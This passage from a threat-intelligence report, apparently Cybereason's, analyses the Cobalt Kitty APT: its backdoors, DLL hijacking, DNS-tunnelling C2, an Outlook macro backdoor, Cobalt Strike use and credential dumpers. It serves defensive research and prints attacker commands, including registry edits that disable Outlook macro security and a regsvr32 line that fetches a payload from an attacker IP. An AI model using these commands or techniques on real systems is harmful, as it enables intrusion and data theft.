.ps1|.exe|\n\n\n-----\n\n|Vessel|Legitimate applications vulnerable to DLL hijacking / PowerShell|Standalone executables|\n|---|---|---|\n|Loader and Process Injection|Loader decrypts the backdoor payload and injects to host processes: rundll32.exe / svchost.exe / arp.exe / PowerShell.exe|No injection to host processes documented|\n|Anti analysis tricks|More sophisticated anti-debugging anti- emulation tricks were put to hinder analysis|Anti-analysis tricks exist, however, fewer and simpler|\n\n\nIn terms of the backdoor’s features, it has similarities to the backdoor (SOUNDBITE), described\nin [FireEye’s report about APT32 (OceanLotus). However, FireEye’s analysis of this backdoor is](https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html)\n**not publicly available. Therefore, Cybereason cannot fully determine whether SOUNDBITE**\nand Denis are the same backdoor, even though the likelihood seems rather high.\n\nThe backdoor’s main purpose was to provide the attackers with a “safe” and stealthy channel to\ncarry out post-exploitation operations, such as **information gathering, reconnaissance,**\n**lateral movement and data collection (stealing proprietary information). The backdoor uses**\n**DNS Tunneling as the main C2 channel between the attackers and the compromised hosts.**\nThe backdoor was mainly exploiting a rare “phantom DLL hijacking” against legitimate\n**Windows Search applications. The attacker also used a PowerShell version of the backdoor on**\na few machines. However, the majority came in a DLL format.\n\nMost importantly, the analysis of the backdoor binaries strongly suggests that the binaries used\nin the attack were custom made and differ from other binaries caught in the wild. The binaries\nwere generated using a highly-sophisticated PE modification engine, which shows the threat\nactor’s high level of sophistication.\n\nFour variants of the main backdoor were found in the environment:\n\n|File name|Variation type|SHA-1 hash|\n|---|---|---|\n|msfte.dll|Injected host process: svchost.exe|638B7B0536217C8923E856F4138D9CA FF7EB309D|\n|msfte.dll|Injected host process: rundll32.exe|BE6342FC2F33D8380E0EE5531592E9F 676BB1F94|\n|msfte.dll|Injects host process: arp.exe|43B85C5387AAFB91AEA599782622EB9 D0B5B151F|\n|PowerShell #1: Sunjavascheduler.ps1 SndVolSSO.ps1 PowerShell #2: SCVHost.ps1|Injected host process: PowerShell.exe (via reflective DLL injection)|91E9465532EF967C93B1EF04B7A906A A533A370E 0d3a33cb848499a9404d099f8238a6a0e0|\n\n\n-----\n\n|Col1|Col2|a4b471|\n|---|---|---|\n\n\n###### 3-in-1: Phantom DLL hijacking targeting Microsoft’s Wsearch \n\n[The “msfte.dll” payloads exploits a rather rare “phantom DLL hijacking” vulnerability against](http://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/)\ncomponents of Microsoft’s Windows Search to gain **stealth, persistence and privilege**\n**escalation all at once. There are only a few documented cases where it was** [used in an APT.](https://hitcon.org/2016/pacific/0composition/pdf/1202/1202%20R0%200930%20an%20intelligance-driven%20approach%20to%20cyber%20defense.pdf)\nThis vulnerability is found in all supported Windows versions (tested against Windows 7 to 10)\nagainst the following applications:\n\n**SearchIndexer.exe (C:\\Windows\\System32\\)**\n**SearchProtocolHost.exe (C:\\Windows\\System32\\)**\n\nThese applications play a crucial role in Windows’ native search mechanism, and are launched\n**automatically by the Wsearch service, meaning that they also** **run as SYSTEM. From an**\nattacker perspective, exploiting these applications is very cost effective since it allows them to\nachieve two goals simultaneously: persistence and privilege escalation to SYSTEM.\n\nThe core reason for this lies in the fact that these applications attempt to load a DLL called\n“msfte.dll.” This DLL does not exist by default on Windows OS, hence, the name “phantom\n**DLL”. Attackers who gain administrative privileges can place a fake malicious “msfte.dll” under**\n“C:\\Windows\\System32\\”, thus ensuring that the DLL will be loaded automatically by\n**SearchIndexer.exe and** **SearchProtocolHost.exe without properly validating the integrity of**\nthe loaded module:\n\n\n-----\n\n*** Following responsible disclosure, this vulnerability was reported to Microsoft on April\n**1, 2017.**\n\n###### Functionality\n\nThe fake msfte.dll is not the core backdoor payload. It serves as a loader whose purpose is to\nload the malicious code in a stealthy manner that will also ensure persistence. The actual\npayload is decoded in memory and **injected to other Windows host processes, such as:**\n**svchost.exe, rundll32.exe and arp.exe. Once the core payload is injected, the backdoor will**\ncommence C2 communication using DNS tunneling. The backdoor will send details about the\ninfected host, network and the users to the C&C server, and will wait for further instructions from\nits operators. The main backdoor actions, as observed by Cybereason, consisted of:\n\n  - **Deploying additional backdoors (goopdate.dll + Outlook backdoor)**\n\n  - **Reconnaissance and lateral movement commands (via cmd.exe)**\n\n  - **Deploying other hacking tools (Mimikatz, NetCat, PowerShell bypass tool, etc.)**\n\nThe backdoor gives its operator the ability to perform different tasks on the infected machines,\ndepending on the commands (flags) received from C&C:\n\n  - Create/delete/move files and directories\n\n  - Execute shell commands used for reconnaissance and information gathering\n\n  - Enumerate users, drivers and computer name\n\n  - Query and set registry keys and values\n\n\n-----\n\n###### Static analysis\n\nThe msfte.dll loader payloads were all compiled during the time of the attack, showing that the\nattackers were preparing new samples on the fly. All observed loader payloads are 64-bit\npayloads. However, the actual backdoor payload is always 32-bit (using WOW64). This is a\nrather peculiar feature of this backdoor. The core backdoor payload was compiled using\nMicrosoft Visual Studio (C++), however, the loader does not carry any known compiler\nsignatures.\n\nAnother sign that the loader’s code was custom-built can be found when examining instructions\nin the code that are clearly not compiler-generated. Instructions like _CPUID, XMM_\n_instructions/registers, xgetbv, as well as others, were placed within the binaries for the obvious_\nreason of anti-emulation. In addition, the loader’s code also contain many “common” antidebugging tricks, using APIs such as: _IsDebuggerPresent(),_ _OutputDebugString(),_\n_SetLastError() and more._\n\nThe file structure does not contain any unusual sections:\n\nHowever, the resources section does contains a base64-encoded payload:\n\n\n-----\n\nWhen decoding the base64 resource, there’s a large chunk of shellcode that is followed by a\ncorrupted PE file, whose internal name is “CiscoEapFast.exe”:\n\nIt’s interesting to mention that several samples of the Denis Backdoor that were caught in the\n**wild (not as part of this attack), were also named CiscoEapFast.exe. Please see the**\n[Attackers’ Profile and Indicators of](https://www.cybereason.com/labs-operation-cobalt-kitty-a-large-scale-cyber-espionage-apt-in-asia/) Compromise section for more information.\n\nThis embedded executable is the actual payload that is injected to the Windows host processes,\nonce the fake DLL is loaded and executed.\n\n\n-----\n\nThe loader’s export table lists over 300 exported functions. This is highly unusual for malware,\nand is one of the most intriguing features:\n\nIf we take a look at the address that this RVA translates to in a live instance of msfte.dll (Image\nbase + 0x1060) here is what we see:\n\nIn other words, the author simply created a small do-nothing function (that just exits the current\nprocess) for all of the exports to resolve to. Exports like this would have been generated at\ncompile-time, or implanted here using a highly sophisticated PE modification engine. This\nindicates that this entire attack was planned in advance and that this binary was **custom-built**\n**to hijack specific applications. Indications of such pre-meditated design were found during**\nthe attack, when more backdoor variants were discovered exploiting DLL-hijacking against\nlegitimate Kaspersky and Google applications.\n\nTake the ability to exploit Kaspersky’s AVPIA application. Examination of the exported functions\nclearly show that the attackers generated the same exports (e.g “CreateSetupProductInfo”) that\nare found in a legitimate Kaspersky’s product_info.dll:\n\n|Exports of a legitimate product_info.dll|Exports of msfte.dll backdoor|\n|---|---|\n|File name: product_info.dll SHA-1: 6a8c955e5e17ac1adfecedabbf8dcf0861a74f7|File name: msfte.dll SHA-1: C6a8c955e5e17ac1adfecedabbf8 dcf0861a74f7|\n\n\n-----\n\n###### Dynamic analysis\n\nWhen the fake msfte.dll is loaded to searchindexer.exe or searchprotocolhost.exe, one of the\nfirst steps it takes is to dynamically resolve critical APIs, using the good ol’ GetProcAddress()\n**and LoadLibrary() combination:**\n\n\n-----\n\nThen the loader will load the base-64 encoded payload from the resources section:\n\n###### Variation in process injection routines\n\nAs mentioned earlier, the msfte.dll samples showed variation in the target host processes for\ninjection (svchost.exe, rundll32.exe and arp.exe). However, there’s also a variation in the\ninjection technique that was used to inject the payloads:\n\nProcess Injection Process Hollowing\nTarget host processes: rundll32.exe Target host processes: svchost.exe / arp.exe\n\n**Determining the path of target host process:** **Determining the path of target host process:**\n**GetSystemDirectoryA → PathAppendA →** **GetSystemDirectoryA → PathAppendA →**\n\n**Process Injection routine:** **Process Hollowing routine:**\nCreateProcessA → VirtualAllocEx → CreateProcessA → VirtualAllocEx →\nWriteProcessMemory → CreateRemoteThread WriteProcessMemory → Wow64GetThreadContext →\n\n**Wow64SetThreadContext → ResumeThread**\n\nWhy the backdoor authors chose to implement two different process injection techniques is\nunclear. But these implementations lead to some clear conclusions:\n\n1. The use of PathAppendA API is common to both injections. This is a rather obscure API\n\nthat is not commonly observed in malware, at least not in the context of code injection.\n2. Use of a less-common process hollowing implementation:\n\nThis style of [process hollowing](http://resources.infosecinstitute.com/process-hallowing/#gref) is quite uncommon. Usually in process hollowing, the\n_ZwUnmapViewOfSection or_ _NtUnmapViewOfSection API functions are used to unmap_\nthe original code. But in this case, the original target host process code is not mapped\nout. Instead, the loader uses the _Wow64SetThreadContext_ API to change the EAX\nregister to point to the malicious payload entry point rather than the entry point of the\noriginal/authentic svchost executable in memory.\n\n|Process Injection Target host processes: rundll32.exe|Process Hollowing Target host processes: svchost.exe / arp.exe|\n|---|---|\n|Determining the path of target host process: GetSystemDirectoryA → PathAppendA → Process Injection routine: CreateProcessA → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread|Determining the path of target host process: GetSystemDirectoryA → PathAppendA → Process Hollowing routine: CreateProcessA → VirtualAllocEx → WriteProcessMemory → Wow64GetThreadContext → Wow64SetThreadContext → ResumeThread|\n\n\n-----\n\n3. The use of Wow64 APIs indicates that the author went specifically out of their way to\n\nutilize a 32-bit payload system, even thought that the loaders are 64-bit payloads.\n\n###### The backdoor code\n\nThe injected payload consists of a long shellcode payload that is followed by a PE file, whose\nMZ header as well as other sections of the PE structure have been corrupted for anti-analysis\npurposes and also possibly to evade memory-based security solutions:\n\nThe purpose of the shellcode is to dynamically resolve the imports as well as to fix the\ndestroyed PE sections on the fly. The first step is to resolve kernel32.dll in order to import\n**GetProcAddress() and LoadLibrary() and through them dynamically resolve the rest of the**\nimported APIs:\n\nResolving GetProcAddress():\n\n\n-----\n\nOnce the repair is done, the shellcode will create a new RWX region, and copy the PE there,\nleaving the MZ header remains corrupted:\n\nThe PE’s metadata contains the file name (“ciscoeapfast.exe”) and description (“Cisco EAPFAST Module”). The metadata must have been manually altered by the backdoor authors to\nmake it look like a credible product:\n\nSHA-1: E9DAB61AE30DB10D96FDC80F5092FE9A467F2CD3\n\nThe strings “ciscoeapfast.exe” and “Cisco EAP-FAST Module” were found in most of the\nsamples of the Denis backdoor that were recovered during the investigation. In addition, the\n\n\n-----\n\n[threat actor has been using it in other attacks as well. Please see our Attackers’ Profile &](https://www2.cybereason.com/asset/61:research-cobalt-kitty-profile-iocs)\n[Indicators of Compromise section](https://www2.cybereason.com/asset/61:research-cobalt-kitty-profile-iocs) of this report.\n\nFinally, the backdoor will decrypt important strings, such as IPs and domain names that are\nnecessary for the C&C communication via DNS Tunneling.\n\nExcerpt from the domain decryption subroutine:\n\nThe following screenshot shows the final decrypted strings used for the DNS Tunneling\ncommunication:\n\n  - **DNS Server IPs: 208.67.222.222 (OpenDNS) and Google (8.8.8.8)**\n\n  - **Domain name: teriava(.)com**\n\n\n-----\n\n###### C2 communication\n\nAs mentioned before, the backdoor uses a stealthy C2 communication channel by implementing\nDNS Tunneling. This technique uses DNS packets to transfer information between two hosts. In\ngeneral, this technique is considered to be rather stealthy since not many security products\nperform deep packet inspection, which would detect this activity. The backdoor authors added\neven more stealthy components to this technique and made sure that no direct connection was\nestablished between the compromised machines and the real C&C servers.\n\nThe attackers used trusted DNS servers, such as OpenDNS and Google’s DNS servers, in\norder to resolve the IPs of the domains that were hidden inside the DNS packets. Once the\npackets reached the real C&C server, the base64-encoded part is stripped, decoded and reassembled, thus enabling communication as well as data exfiltration. This is a rather slow yet\nsmart way to ensure that the traffic will not be filtered, since most organizations will not block\nDNS traffic to Google or OpenDNS servers. This technique’s biggest caveat is that it can get\nvery “noisy” in terms of the unusual amount of DNS packets required to exfiltrate data such as\nfiles and documents.\n\nExample of the network traffic generated by the backdoor\n\n\n-----\n\nThe destination IP is Google’s 8.8.8.8 DNS server, and the DNS packet contain the real domain\nin the query field. The data sent to the server comes in the form of a base64-encoded string,\nwhich is appended as a subdomain:\n\n##### Second backdoor: “Goopy”\n\nThe adversaries introduced another backdoor during the second stage of the attack. We named\nit “Goopy”, since the backdoor’s vessel is a fake goopdate.dll file, which was dropped together\nwith a legitimate GoogleUpdate.exe application which is vulnerable to DLL hijacking and\nplaced the two files under a unique folder in APPDATA:\n_C:\\users\\xxxxxxxx\\appdata\\local\\google\\update\\download\\{GUID}\\_\n\nSeven unique samples of the “Goopy” backdoor were recovered by Cybereason:\n\n\n-----\n\n|File name|SHA-1|\n|---|---|\n|goopdate.dll|9afe0ac621c00829f960d06c16a3e556cd0de249 973b1ca8661be6651114edf29b10b31db4e218f7 1c503a44ed9a28aad1fa3227dc1e0556bbe79919 2e29e61620f2b5c2fd31c4eb812c84e57f20214a c7b190119cec8c96b7e36b7c2cc90773cffd81fd 185b7db0fec0236dff53e45b9c2a446e627b4c6a ef0f9aaf16ab65e4518296c77ee54e1178787e21|\n\n\nThe attackers used a legitimate and signed GoogleUpdate.exe application that is vulnerable\nto DLL hijacking vulnerability:\nGoogleUpdate.exe, SHA-1: d30e8c7543adbc801d675068530b57d75cabb13f,\n\nGoogleUpdate’s DLL hijacking vulnerability was previously reported to already in 2014, since\nother malware have been exploiting this vulnerability. Most notable ones are the notorious\n[PlugX](https://www.mcafee.com/hk/resources/solution-briefs/sb-quarterly-threat-q3-2014-2.pdf) and the [CryptoLuck ransomware.](https://www.bleepingcomputer.com/news/security/cryptoluck-ransomware-being-malvertised-via-rig-e-exploit-kits/)\n\n***** Following responsible disclosure, this vulnerability was reported to Google on April 2,**\n**2017.**\n\n###### Analysis of Goopy\n\nFrom features perspective, Goopy shows great similarities to the Denis backdoor. At the same\ntime, code analysis of the two backdoor clearly shows substantial differences between the two.\nThe coding style and other static features suggest that they were compiled (and possibly\nauthored) by the same threat actor. One of the more interesting features of Goopy is that it\n\n\n-----\n\nseems specifically designed to exploit a “DLL Hijacking” vulnerability against Google Update\n(googleupdate.exe) using a fake goopdate.dll module. There may be other versions targeting\nother applications, but the ones Cybereason obtained, **specifically contained code that**\n**specifically targeted GoogleUpdate. The Goopy backdoor was dropped and launched by the**\nDenis backdoor. The machines infected with Goopy had already been infected by the Denis\nbackdoor. Generally, it is not very common to see multiple backdoors from the same threat\nactors residing on the same compromised machines. Nonetheless, this pattern was observed\non multiple machines throughout the attack.\n\nFollowing are the most notable features that distinguish Goopy from Denis:\n\n  - **Unusually large files (30MB to 55MB) - Compared to the Denis backdoor, which**\n\nranges between 300KB and 1.7MB. This is quite unusual. The goopdate.dll files are\ninflated with null characters, most probably to bypass security solutions that don’t inspect\nlarge files.\n\nIn addition, the Goopy backdoor has a lot of junk code interlaced with real functions - to\nmake analysis harder. One example is in a giant subroutine that **contains more than**\n**5600 nodes, containing** many anti-debugging / anti-disassembly tricks, including infinite\nloops:\n\n  - **Specifically tailored to target GoogleUpdate**   - The Goopy payloads contain a hard\ncoded verification made to ensure that the backdoor is loaded and executed by\nGoogleUpdate. If the check fails, the backdoor will terminate the googleupdate process\nand exit. By comparison, The Denis backdoor loader is more “naive”, since it doesn’t\ncheck from which process the backdoor is executed, thus making it also more flexible,\nsince it can exploit DLL hijacking on any given vulnerable application:\n\n\n-----\n\n- **Stealthier and more advanced** - Unlike the Denis backdoor, goopdate.dll shows\n\nsignificant signs of post-compilation modification. The code section of this PE is\nextremely interesting and unusual, and demonstrates the potential of a very powerful\ncode-generation engine underlying it. The backdoor’s code and data are well protected\nand are decrypted at runtime, using a complex polymorphic decryptor. The polymorphic\ndecryptor is comprised of thousands of lines that are interlaced with junk API calls and\nnonsense code in order to thwart analysis. Here’s an example:\n\n\n-----\n\n- **HTTP Communication -** Unlike the Denis backdoor, Goopy was observed\n\ncommunicating over HTTP (port 80 and 443), in addition to its DNS-based C2 channel:\n\nDNS resolution of the C&C server IP:\n\nExample of HTTP usage, as observed using Wireshark to log the network traffic\ngenerated by Goopy:\n\n\n-----\n\n- **Different DNS tunneling implementation -** Unlike the main backdoor, this variant\n\nimplements a different algorithm for the C2 communication over DNS tunneling and also\nused DNS TXT records. In addition, most of the samples communicated directly with the\nC&C servers over DNS, unlike the Denis backdoor that comes pre-configured with\nGoogle and OpenDNS as their intermediary DNS servers:\n\n- **Different Mutex creation routine - The mutex creation routine exhibited in “Goopy” is**\n\ndifferent from the main backdoor, which is made out of a pseudo-random generated\nvalue that is appended to the user name:\n\n\n-----\n\n**As opposed to the Denis’ mutex pattern, which has a pseudo-random generated value**\nappended to the user name, the mutex format is different and contains neither curly brackets\nnor dashes:\n\n  - **Persistence - While Denis uses Window’s Wsearch Service for persistence, Goopy**\n\nuses also scheduled tasks to ensure that the backdoor is running. The scheduled task\nruns every hour. If the backdoor’s mutex is detected, the newly run process will exit.\n\n\n-----\n\n##### DLL side loading against legitimate applications\n\nThe attackers used DLL side loading, a well-known technique for evading detection that uses\nlegitimate applications to run malicious payloads. In Cobalt Kitty, the attackers used DLL side\nloading against software from Kaspersky, Microsoft and Google. The hackers likely picked these\nprograms since they’re from reputed vendors, making users unlikely to question the processes\nthese programs run and decreasing the chances that analysts will scrutinize them. For example,\nthe attackers used the following legitimate Avpia.exe binary:\n\n**SHA-1:** 691686839681adb345728806889925dc4eddb74e\n\n\n-----\n\nThey dropped the legitimate avpia.exe along with a fake DLL “product_info.dll” into\nPROGRAMDATA:\n**SHA-1: 3cf4b44c9470fb5bd0c16996c4b2a338502a7517**\n\nThe payload found in the fake product_info.dll communicates with domain and IP that was\npreviously used in the attack in to drop Cobalt Strike payloads:\n\n\n-----\n\n##### Outlook backdoor macro\n\nDuring the third phase of the attack, the attackers introduced a new way to communicate with\ntheir C&C servers: an Outlook macro that serves as a backdoor. This backdoor is very unique\nand was not documented before to be used in APTs. The only references that come close to\n[that type of Outlook backdoor are theoretical papers by the NSA (unclassified paper from 2000)](https://www.security-audit.com/files/eec-4.pdf)\n[as well as a research paper presented by a group of security researchers in 2011.](https://www.researchgate.net/publication/295079733_Perverting_Emails_a_New_Dimension_in_Internet_inSecurity)\n\nThe attackers replaced Outlook’s original VbaProject.OTM file, which contains Outlook’s\nmacros, with a malicious macro that serves as the backdoor. The backdoor receives commands\nfrom a Gmail address operated by the threat actor, executes them on the compromised\nmachines and sends the requested information to the attacker’s Gmail account.\n\nThis technique was observed only on a handful of compromised machines that belonged to toplevel management and were already compromised by at least one other backdoor.\n\nBefore the attackers deployed the macro-based backdoor, they had to take care of two things:\n\n**1. Creating persistence**\n\nThe attackers modified specific registry values to create persistence:\n\nREG ADD \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\14\\Outlook\" /v\n\"LoadMacroProviderOnBoot\" /f /t REG_DWORD /d 1\n**2. Disabling Outlook’s security policies**\n\n\n-----\n\nTo do that, the attackers modified Outlook’s security settings to enable the macro to\nrun without prompting any warnings to the users:\n\nREG ADD \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\14\\Outlook\\Security\"\n/v \"Level\" /f /t REG_DWORD /d 1\n\nFinally, the attackers replaced the existing VbaProject.OTM with the fake macro:\n_/u /c cd c:\\programdata\\& copy VbaProject.OTM_\n_C:\\Users\\[REDACTED]\\AppData\\Roaming\\Microsoft\\Outlook_\n\n**VbaProject.OTM, SHA-1:320e25629327e0e8946f3ea7c2a747ebd37fe26f**\n\n###### The backdoor macro\nOnce installed and executed, the macro performed these actions:\n**1. Search for new instructions - The macro will loop through the contents of Outlook’s inbox**\nand searches for the strings “$$cpte” and “$$ecpte” inside an email’s body. These two strings\nmark the start and end of the strings the attackers are sending.\n\nThe “beauty” of using these markers is that the attackers don’t need to embed their email\naddresses in the macro code, and can change as many addresses as they want. They only\nneed to include the start-end markers:\n\n2. Write the message to temp file - When the macro finds an email whose content matches\nthe strings, the message body is copied to %temp%\\msgbody.txt :\n\n3. Delete the email - The backdoor authors were keen to dispose of the evidence quickly to\navoid raising any suspicions from the victims. Once the email content is copied, the macro\ndeletes the email from the inbox:\n\n\n-----\n\n4. Then the msgbody is parsed and the string between the start-end markers is passed as a\ncommand to cmd.exe:\n\n5. Acknowledgement - After the command is executed, the macro will send an\nacknowledgment email to the attackers’ Gmail account (“OK!”), which it will obtain from the\ndeleted items folder. Then it will delete the email from the sent items folder.\n\n6. Exfiltrate data - The macro will send the requested data back to the attackers as an\nattachment, after it obtains the address from the deleted items folder.\n\nThis unique data exfiltration technique was detected by Cybereason:\n\n\n-----\n\nAnalysis of the commands sent by the attackers showed that they were mainly interested in:\n\n1. **Proprietary information - They attempted to exfiltrate sensitive documents from the**\n\ntargeted departments that contained trade secrets and other proprietary information.\n2. **Reconnaissance - The attackers kept collecting information about the compromised**\n\nmachine as well as the network using commands like: ipconfig, netstat and net user.\n\n##### Cobalt Strike\n\n[Cobalt Strike](https://www.cobaltstrike.com/) is a well-known, commercial offensive security framework that is popular among\nsecurity professionals and is mainly used for security assessments and penetration testing.\nHowever, illegal use of this framework has been reported in the past in the context of advanced\npersistent threats (APTs). Cobalt Strike is also one of the main links of this APT to the\nOceanLotus group. This group is [particularly known for using Cobalt Strike](https://read01.com/yxjnL2.html) [in its different APT](http://wps2015.org/drops/drops/APT2015%E2%80%94%E4%B8%AD%E5%9B%BD%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%80%A7%E5%A8%81%E8%83%81%E7%A0%94%E7%A9%B6%E6%8A%A5%E5%91%8A.html)\n[campaigns throughout Asia.](https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html)\n\nThe adversaries extensively used this framework during this attack, particularly during the first\n[and fourth stages. Cobalt Strike’s Beacon](https://www.cobaltstrike.com/help-beacon) was the main tool used in the attack, as shown in the\nfollowing screenshot, which shows memory strings of one of the payloads used in the attack\n(ed074a1609616fdb56b40d3059ff4bebe729e436):\n\n\n-----\n\nThe attackers also used a range of other Cobalt Strike and Metasploit tools such as loaders and\nstagers, especially during the fileless first stage of the operation, which relied mainly on Cobalt\nStrike’s PowerShell payloads.\n\n##### COM Scriptlets (.sct payloads)\n\nIn phases one and two, the attackers used PowerShell scripts to download COM Scriptlets\ncontaining malicious code that ultimately used to download a Cobalt Strike beacon. An almost\n[identical usage of this technique (and even payload names) was seen in other APTs carried out](https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html)\n[by the OceanLotus group. This technique is very well documented and has gained popularity in](https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html)\nrecent attacks, especially because it’s effectiveness in bypassing Window’s Application\nWhitelisting. For further details about this technique, please refer to:\n[http://subt0x10.blogspot.jp/2016/04/setting-up-homestead-in-enterprise-with.html](http://subt0x10.blogspot.jp/2016/04/setting-up-homestead-in-enterprise-with.html)\n[http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)\n[pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)\n[http://subt0x10.blogspot.co.il/2016/04/bypass-application-whitelisting-script.html](http://subt0x10.blogspot.co.il/2016/04/bypass-application-whitelisting-script.html)\nIn the screenshot below, an injected rundll32.exe process spawns a cmd.exe process that\nlaunches regsvr32.exe in order to download a file from the C&C server.\n\n\n-----\n\nThe command line of the regsvr32.exe process is:\n_regsvr32 /s /n /u /i:hxxp://108.170.31.69:80/a scrobj.dll_\n\nAdditional examples of payloads observed in the attack using COM scriplets:\n###### hxxp://108.170.31.69/a – 02aa9ad73e794bd139fdb46a9dc3c79f4ff91476 hxxp://images.verginnet.info:80/ppap.png - f0a0fb4e005dd5982af5cfd64d32c43df79e1402 hxxp://support(.)chatconnecting.com/pic.png - f3e27ad08622060fa7a3cc1c7ea83a7885560899\n\nThe downloaded file appears to be a COM Scriptlets (.sct):\n\nThese COM Scriptlets serve two main purposes:\n\n\n-----\n\n1. Bypass Window’s Application Whitelisting security mechanism.\n2. Download additional payloads from the C&C server (mostly beacon).\n\nThe COM scriptlet contains a VB macro with an obfuscated payload:\n\nAfter decoding the encoded part, it can be clearly seen that the payload uses Windows APIs\nthat are indicative of process injection. In addition, it is possible to see that the attackers aimed\nto evade detection by “renaming” process injection-related functions and also adding spaces to\nbreak signature patterns:\n\nIn addition, the decoded code contains contains a suspicious looking array (shellcode) as well\nas the process injection function to Rundll32.exe:\n\n\n-----\n\nThe decoded shellcode is similar to other downloader payloads observed in this attack, whose\npurpose is to download and execute Cobalt Strike Beacon payload:\n\n\n-----\n\n##### Obfuscation and evasion\n\n###### Don’t-Kill-My-Cat\n\nMost of the PowerShell payloads seen in the attack were wrapped and obfuscated using a\n[framework called Don’t-Kill-My-Cat (DKMC)](https://github.com/Mr-Un1k0d3r/DKMC) that is found on GitHub. This framework generates\npayloads especially designed to evade antivirus solutions. The unique strings used by this\nframework perfectly match the malicious payloads that were collected during the attack, as\ndemonstrated below:\n\nDKMC’s source code:\n[https://github.com/Mr-Un1k0d3r/DKMC/blob/master/core/util/exec-sc.ps1](https://github.com/Mr-Un1k0d3r/DKMC/blob/master/core/util/exec-sc.ps1)\n\nThe same framework was previously observed in PowerShell payloads of the OceanLotus\n**[Group, as can be seen in a screenshot taken from a previous report:](https://read01.com/yxjnL2.html)**\n\n\n-----\n\n###### Examples of Don’t-Kill-My-Cat used in Cobalt Kitty\n\n**Example 1: Cobalt Strike Beacon payload found in ProgramData**\n\nFile: C:\\ProgramData\\syscheck\\syscheck.ps1\nSHA-1: 7657769F767CD021438FCCE96A6BEFAF3BB2BA2D\n\n**Example 2: Cobalt Strike Beacon payload from C&C server**\n\n\n-----\n\nSHA-1: 6dc7bd14b93a647ebb1d2eccb752e750c4ab6b09\n\n###### Invoke-obfuscation (PowerShell Obfuscator)\n\nIn the fourth phase of the attack, the attackers changed their PowerShell obfuscation framework\nand used a new tool called “ [”, which is written by Daniel Bohannon](http://www.danielbohannon.com/) and\n[available on GitHub. This tool was recently observed being used by the OceanLotus Group in](https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html)\n[APTs in Vietnam.](https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html)\n\nThe attackers used it to obfuscate their new PowerShell payloads, which consisted mainly of\nCobalt Strike Beacon, Mimikatz and a custom-built credential dumper. Below is an example of a\nPowerShell payload of a custom credential dumper that was obfuscated with “InvokeObfuscation”:\n\n\n-----\n\n###### PowerShell bypass tool (PSUnlock)\n\nDuring the attack’s fourth phase, the attackers attempted to revive the PowerShell infrastructure\nthat was shut down during the attack’s first phase.\n\nTo restore the ability to use Cobalt Strike and other PowerShell-based tools, the attackers used\n[a slightly customized version of a tool called PSunlock, which is available on GitHub. The tool](https://github.com/p3nt4/PSUnlock)\nprovides a way to bypass Windows Group Policies preventing PowerShell execution, and\nexecute PowerShell scripts without running PowerShell.exe.\n\nTwo different payloads of this tool were observed on the compromised machines:\n52852C5E478CC656D8C4E1917E356940768E7184 - pshdll35.dll\nEDD5D8622E491DFA2AF50FE9191E788CC9B9AF89 - pshdll40.dll\nThe metadata of the file clearly shows that these files are linked to the PSUnlock project:\n\n\n-----\n\n###### Examples of usage\nThe attackers changed the original (.exe) file to a .dll file and launched it with Rundll32.exe,\npassing the desired PowerShell script as an argument using the “-f” flag:\n###### RUNDLL32 C:\\ProgramData\\PShdll35.dll,main -f C:\\ProgramData\\nvidia.db\n\nThe script actually contains a Cobalt Strike Beacon payload, as shown in the screenshot below,\ncontaining the beacon’s indicative strings:\n\n\n-----\n\n##### Credential dumpers\n\nThe attackers used at least four different kinds of credential dumping tools. Some were custombuilt for this operation and others were simply obfuscated to evade detection.\n\n**The main credential dumpers were:**\n\n1. Mimikatz\n2. GetPassword_x64\n3. Custom Windows Credential Dumper\n4. Customized HookChangePassword\n\n###### Mimikatz\n\n[Benjamin Delpy’s Mimikatz](https://github.com/gentilkiwi/mimikatz) is one of the most popular credential dumping and post-exploitation\ntools. It was definitely among the threat actor’s favorite tools: it played a major role in helping\nharvest credentials and carry out lateral movement. The attackers successfully uploaded and\nexecuted at least 14 unique Mimikatz payloads, wrapped and obfuscated using different tools.\n\nThe following types of Mimikatz payloads were the the most used types:\n\n1. Packed [Mimikatz binaries (using custom and known packers)](https://github.com/gentilkiwi/mimikatz)\n[2. PowerSploit’s “Invoke-Mimikatz.ps1”](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1)\n[3. Mimikatz obfuscated with subTee's PELoader](https://github.com/subTee/Malwaria/blob/master/PELoader.cs)\nWhile most antivirus vendors would detect the official Mimikatz binaries right away, it is still very\neasy to bypass the antivirus detection using different packers or obfuscators.\n\nDuring the attack’s first and second phases, the adversaries mainly used the packed binaries of\n[Mimikatz as well as the PowerSploit’s “Invoke-Mimikatz.ps1.” As a result, it was very easy to](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1)\ndetect Mimikatz usage just by looking for indicative command line arguments, as demonstrated\nhere:\n\n\n-----\n\nHowever, during the third and fourth phases of the attack, the attackers attempted to\n[improve their “stealth”, and started using Malwaria’s PELoader](https://github.com/subTee/Malwaria/blob/master/PELoader.cs) Mimikatz:\n\nThe “system.exe” binary is based on Malwaria’s PELoader, which is written using the .NET\nframework and is fairly easy to decompile. It’s stealthier because it dynamically loads Mimikatz’s\nbinary from the resources section of the PE, and then passes the relevant arguments internally,\n**without leaving traces in the process command line arguments:**\n\n\n-----\n\nExamining the the resources section, one can see a large base64-encoded section:\n\nAfter decoding it, we can see the MZ header - indicating that indeed a PE file was hidden inside\nthe resources section:\n\n\n-----\n\nSimilar to the original file, this file is also a .NET application, so it was easy to decompile:\n\nExamining the resources section shows the base64 embedded file:\n\nAfter decoding the base64 section, we see that it is another PE file, which is the 